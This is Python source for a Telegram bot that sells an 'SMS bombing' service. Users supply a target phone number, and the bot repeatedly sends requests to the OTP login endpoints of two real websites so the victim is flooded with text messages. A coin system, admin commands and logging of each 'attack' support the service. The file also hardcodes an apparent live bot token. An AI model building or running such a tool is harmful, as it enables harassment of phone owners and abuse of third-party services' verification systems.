import telebot
import requests
import json
import os
import time
import threading
import random
from telebot import types
from datetime import datetime

# --- কনফিগারেশন ---
TOKEN = "8210992248:AAGA1Oy_UNI75ZbLVdScaB2nzMGyoGLvye4"
ADMIN_ID = 8504263842 
LOG_CHANNEL = "@sMsBotManagerDUModz" 
REQUIRED_CHANNEL = "@DemoTestDUModz" 
LOGO_URL = "https://raw.githubusercontent.com/DarkUnkwonModZ/Blogger-DarkUnkownModZ-Appinfo/refs/heads/main/IMG/dumodz-logo-final.png"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- ডাটাবেস সিস্টেম ---
def load_db(file):
    if not os.path.exists(file):
        with open(file, 'w') as f: json.dump({}, f)
        return {}
    try:
        with open(file, 'r') as f: return json.load(f)
    except: return {}

def save_db(file, data):
    with open(file, 'w') as f:
        json.dump(data, f, indent=4)

users = load_db('users.json')
keys = load_db('keys.json')

# --- লগিং ফাংশন ---
def send_log(text):
    try:
        bot.send_message(LOG_CHANNEL, f"📜 **Log Update**\n⏰ Time: {datetime.now().strftime('%H:%M:%S')}\n\n{text}")
    except: pass

# --- জয়েন চেক ---
def is_joined(user_id):
    try:
        status = bot.get_chat_member(REQUIRED_CHANNEL, user_id).status
        return status in ['member', 'administrator', 'creator']
    except: return False

# --- ইউজার আপডেট ---
def update_user(user):
    uid = str(user.id)
    if uid not in users:
        users[uid] = {
            "name": user.first_name,
            "username": f"@{user.username}" if user.username else "N/A",
            "status": "Active",
            "coins": 50,
            "sent": 0
        }
        save_db('users.json', users)
        send_log(f"🆕 **New User:** {user.first_name} (`{uid}`)")
    return users[uid]

# --- কমান্ড হ্যান্ডলার (Admin & User) ---

@bot.message_handler(commands=['start'])
def start(message):
    u = update_user(message.from_user)
    if not is_joined(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{REQUIRED_CHANNEL.replace('@','')}"))
        bot.send_message(message.chat.id, "⚠️ **Please join our channel first!**", reply_markup=markup)
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 Attack SMS", callback_data="bomb"),
        types.InlineKeyboardButton("👤 My Profile", callback_data="profile"),
        types.InlineKeyboardButton("🔑 Use Key", callback_data="recharge")
    )
    
    bot.send_photo(message.chat.id, LOGO_URL, caption=f"🔥 **Welcome, {u['name']}!**\nStatus: `{u['status']}`\nCoins: `{u['coins']}`", reply_markup=markup)

# --- এডমিন কমান্ডস ---

@bot.message_handler(commands=['admin'])
def admin_menu(message):
    if message.from_user.id != ADMIN_ID: return
    help_text = (
        "👑 **Admin Control Panel**\n\n"
        "📊 `/stats` - চেক সিস্টেম ওভারভিউ\n"
        "👥 `/users` - সকল ইউজার লিস্ট দেখা\n"
        "⚙️ `/setstatus [ID] [Status]` - ইউজারের স্ট্যাটাস পরিবর্তন\n"
        "💰 `/addcoins [ID] [Amount]` - কয়েন অ্যাড করা\n"
        "🔑 `/gen [Amount]` - রিচার্জ কি (Key) জেনারেট করা\n"
        "📢 `/broadcast [Message]` - সবাইকে মেসেজ দেওয়া"
    )
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['users'])
def list_users(message):
    if message.from_user.id != ADMIN_ID: return
    text = "👥 **Total User List:**\n\n"
    for uid, data in users.items():
        text += f"👤 {data['name']} | ID: `{uid}` | Status: `{data['status']}`\n"
        if len(text) > 3500: # টেলিগ্রাম মেসেজ লিমিট হ্যান্ডলিং
            bot.send_message(message.chat.id, text)
            text = ""
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['setstatus'])
def set_status(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        args = message.text.split()
        target_id = args[1]
        new_status = args[2] # Blocked, Lifetime, Active
        if target_id in users:
            users[target_id]['status'] = new_status
            save_db('users.json', users)
            bot.reply_to(message, f"✅ User `{target_id}` is now `{new_status}`")
            send_log(f"🛠 **Status Changed:**\nUser: `{target_id}`\nNew Status: `{new_status}`\nBy: Admin")
        else: bot.reply_to(message, "❌ User not found!")
    except: bot.reply_to(message, "Usage: `/setstatus [ID] [Blocked/Lifetime/Active]`")

@bot.message_handler(commands=['addcoins'])
def add_coins(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        args = message.text.split()
        target_id = args[1]
        amount = int(args[2])
        if target_id in users:
            users[target_id]['coins'] += amount
            save_db('users.json', users)
            bot.reply_to(message, f"✅ Added {amount} coins to `{target_id}`")
            send_log(f"💰 **Coins Added:**\nUser: `{target_id}`\nAmount: `{amount}`")
        else: bot.reply_to(message, "❌ User not found!")
    except: bot.reply_to(message, "Usage: `/addcoins [ID] [Amount]`")

# --- এসএমএস বোম্বিং ইঞ্জিন ---

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    uid = str(call.from_user.id)
    u_data = users.get(uid)

    if call.data == "profile":
        bot.send_message(call.message.chat.id, f"👤 **Profile:**\nName: {u_data['name']}\nCoins: {u_data['coins']}\nSent: {u_data['sent']}\nStatus: {u_data['status']}")
    
    elif call.data == "bomb":
        if u_data['status'] == "Blocked":
            bot.answer_callback_query(call.id, "🚫 You are blocked!", show_alert=True)
            return
        msg = bot.send_message(call.message.chat.id, "📱 **Enter Target Number:**")
        bot.register_next_step_handler(msg, get_bomb_details)

def get_bomb_details(message):
    num = message.text
    if len(num) == 11 and num.isdigit():
        msg = bot.send_message(message.chat.id, "🔢 **How many SMS? (Max 100):**")
        bot.register_next_step_handler(msg, lambda m: start_bomb(m, num))
    else: bot.send_message(message.chat.id, "❌ Wrong Number!")

def start_bomb(message, num):
    try:
        amount = int(message.text)
        if amount > 100: amount = 100
        uid = str(message.from_user.id)
        cost = amount * 2
        
        if users[uid]['status'] != 'Lifetime' and users[uid]['coins'] < cost:
            bot.send_message(message.chat.id, "⚠️ Low balance!")
            return

        p_msg = bot.send_message(message.chat.id, "🚀 **Attack Started!**")
        threading.Thread(target=bomb_logic, args=(uid, num, amount, cost, p_msg)).start()
    except: pass

def bomb_logic(uid, num, amount, cost, p_msg):
    success = 0
    # High-Success APIs
    urls = [
        "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en",
        "https://bikroy.com/data/relative/login-with-otp"
    ]
    
    for i in range(1, amount + 1):
        try:
            r = requests.post(random.choice(urls), json={"number": "+88"+num, "phone": num}, timeout=5)
            if r.status_code == 200: success += 1
            if i % 10 == 0:
                bot.edit_message_text(f"🚀 **Bombing {num}...**\nSent: {i}/{amount}", p_msg.chat.id, p_msg.message_id)
            time.sleep(0.5)
        except: pass

    if users[uid]['status'] != 'Lifetime':
        users[uid]['coins'] -= cost
    users[uid]['sent'] += success
    save_db('users.json', users)
    
    send_log(f"🚀 **Attack Finished:**\nTarget: `{num}`\nAmount: `{success}`\nUser: {users[uid]['name']} (`{uid}`)")
    
    bot.edit_message_text(f"✅ **Attack Summary**\nTarget: {num}\nSent: {success}\nCoins Left: {users[uid]['coins']}", p_msg.chat.id, p_msg.message_id)

# --- রান ---
if __name__ == "__main__":
    print("DU ModZ Bot is Online...")
    send_log("✅ **Bot is now Online & Ready!**")
    bot.infinity_polling()
